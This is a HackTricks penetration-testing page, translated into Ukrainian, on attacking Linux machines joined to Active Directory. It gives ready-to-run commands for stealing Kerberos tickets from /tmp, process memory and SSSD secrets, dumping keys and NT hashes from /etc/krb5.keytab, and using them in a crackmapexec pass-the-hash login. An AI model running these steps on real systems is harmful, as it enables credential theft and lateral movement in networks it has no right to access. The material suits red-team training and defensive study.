# Linux Active Directory

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% embed url="https://websec.nl/" %}

Лінукс-машина також може бути присутня в середовищі Active Directory.

Лінукс-машина в AD може **зберігати різні квитки CCACHE у файлах. Ці квитки можуть бути використані та зловживані, як і будь-який інший квиток kerberos**. Щоб прочитати ці квитки, вам потрібно бути власником квитка або **root** на машині.

## Enumeration

### AD enumeration from linux

Якщо у вас є доступ до AD в лінукс (або bash у Windows), ви можете спробувати [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) для перерахунку AD.

Ви також можете перевірити наступну сторінку, щоб дізнатися **інші способи перерахунку AD з лінукс**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA є відкритим **альтернативою** Microsoft Windows **Active Directory**, в основному для **Unix** середовищ. Він поєднує в собі повний **LDAP каталог** з MIT **Kerberos** Центром розподілу ключів для управління, подібним до Active Directory. Використовуючи систему сертифікатів Dogtag для управління сертифікатами CA та RA, він підтримує **багатофакторну** аутентифікацію, включаючи смарт-карти. SSSD інтегровано для процесів аутентифікації Unix. Дізнайтеся більше про це в:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Playing with tickets

### Pass The Ticket

На цій сторінці ви знайдете різні місця, де ви могли б **знайти квитки kerberos всередині хоста лінукс**, на наступній сторінці ви можете дізнатися, як перетворити ці формати квитків CCache на Kirbi (формат, який вам потрібно використовувати в Windows) і також як виконати атаку PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### CCACHE ticket reuse from /tmp

Файли CCACHE є бінарними форматами для **зберігання облікових даних Kerberos**, зазвичай зберігаються з правами 600 у `/tmp`. Ці файли можна ідентифікувати за їх **форматом імені, `krb5cc_%{uid}`,** що відповідає UID користувача. Для перевірки квитка аутентифікації, **змінна середовища `KRB5CCNAME`** повинна бути встановлена на шлях до бажаного файлу квитка, що дозволяє його повторне використання.

Перерахуйте поточний квиток, що використовується для аутентифікації, за допомогою `env | grep KRB5CCNAME`. Формат є портативним, і квиток може бути **повторно використаний, встановивши змінну середовища** за допомогою `export KRB5CCNAME=/tmp/ticket.ccache`. Формат імені квитка Kerberos - `krb5cc_%{uid}`, де uid - це UID користувача.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE повторне використання квитків з keyring

**Квитки Kerberos, збережені в пам'яті процесу, можуть бути витягнуті**, особливо коли захист ptrace на машині вимкнений (`/proc/sys/kernel/yama/ptrace_scope`). Корисний інструмент для цієї мети можна знайти за адресою [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), який полегшує витяг, інжектуючи в сесії та скидаючи квитки в `/tmp`.

Щоб налаштувати та використовувати цей інструмент, слід виконати наведені нижче кроки:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ця процедура спробує інжектувати в різні сесії, вказуючи на успіх, зберігаючи витягнуті квитки в `/tmp` з іменуванням `__krb_UID.ccache`.

### Повторне використання квитків CCACHE з SSSD KCM

SSSD підтримує копію бази даних за шляхом `/var/lib/sss/secrets/secrets.ldb`. Відповідний ключ зберігається як прихований файл за шляхом `/var/lib/sss/secrets/.secrets.mkey`. За замовчуванням ключ доступний лише для читання, якщо у вас є **root** права.

Виклик \*\*`SSSDKCMExtractor` \*\* з параметрами --database та --key розпарсить базу даних та **дешифрує секрети**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Кеш облікових даних Kerberos можна перетворити на використовуваний файл Kerberos CCache**, який можна передати Mimikatz/Rubeus.

### Повторне використання квитків CCACHE з keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Витягти облікові записи з /etc/krb5.keytab

Ключі облікових записів служб, які є необхідними для служб, що працюють з привілеями root, надійно зберігаються у файлах **`/etc/krb5.keytab`**. Ці ключі, подібно до паролів для служб, вимагають суворої конфіденційності.

Щоб перевірити вміст файлу keytab, можна використовувати **`klist`**. Цей інструмент призначений для відображення деталей ключа, включаючи **NT Hash** для аутентифікації користувачів, особливо коли тип ключа визначено як 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Для користувачів Linux, **`KeyTabExtract`** пропонує функціональність для витягування хешу RC4 HMAC, який можна використовувати для повторного використання хешу NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
На macOS **`bifrost`** слугує інструментом для аналізу файлів keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Використовуючи витягнуту інформацію про облікові записи та хеші, можна встановити з'єднання з серверами за допомогою інструментів, таких як **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Посилання

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримати HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.

</details>
{% endhint %}
